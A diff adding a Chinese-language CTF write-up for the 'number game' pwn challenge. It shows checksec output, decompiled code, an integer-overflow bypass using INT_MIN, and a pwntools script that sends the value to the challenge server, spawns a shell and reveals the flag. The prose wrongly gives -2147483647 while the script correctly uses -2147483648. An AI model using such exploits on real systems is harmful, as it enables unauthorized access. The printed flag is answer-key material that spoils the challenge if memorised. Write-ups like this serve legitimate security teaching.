@@ -3169,9 +3169,68 @@ io.sendline(shellcode)
 io.interactive()
 ```
 
+------
 
+### [number game](https://ce.pwnthebox.com/challenges?id=1774)
 
+先`file ./wustctf2020_number_game  `查看文件类型，再`checksec --file=./wustctf2020_number_game  `检查一下文件保护情况。
 
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ file ./wustctf2020_number_game                                                              
+./wustctf2020_number_game: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ad95bd0bc056d1f68fc74a2a3f2cd7ce63ada796, not stripped
+                                                                                                    
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ checksec --file=./wustctf2020_number_game                                                 
+[*] '/home/tyd/ctf/pwn/pwnthebox/wustctf2020_number_game'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+使用`IDA pro 32bit`打开附件`wustctf2020_number_game`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  init();
+  vulnerable();
+  return 0;
+}
+```
+
+双击`vulnerable()`查看函数详情：
+
+```c
+unsigned int vulnerable()
+{
+  int v1; // [esp+8h] [ebp-10h] BYREF
+  unsigned int v2; // [esp+Ch] [ebp-Ch]
+
+  v2 = __readgsdword(0x14u);
+  v1 = 0;
+  __isoc99_scanf("%d", &v1);
+  if ( v1 >= 0 || (v1 = -v1, v1 >= 0) )
+    printf("You lose");
+  else
+    shell();
+  return __readgsdword(0x14u) ^ v2;
+}
+```
+
+当输入的数字`v1`是负数，且`v1`的相反数也是负数，才可以执行`shell`。`32`位系统`int`型取值范围是`[-2147483648, 2147483647]`。那这不是显然了吗？直接`nc`进去输入`-2147483647`就行啦。当然也可以编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10124`，发送`payload`即可得到`PTB{2cdb6e65-3494-4643-9d4a-3f08e76c1361}`，提交即可。
+
+```python
+from pwn import *
+
+io = remote('redirect.do-not-trust.hacking.run', 10124)
+io.sendline(b'-2147483648')
+io.interactive()
+```
+
+------
 
 ## Pwnable.kr
 
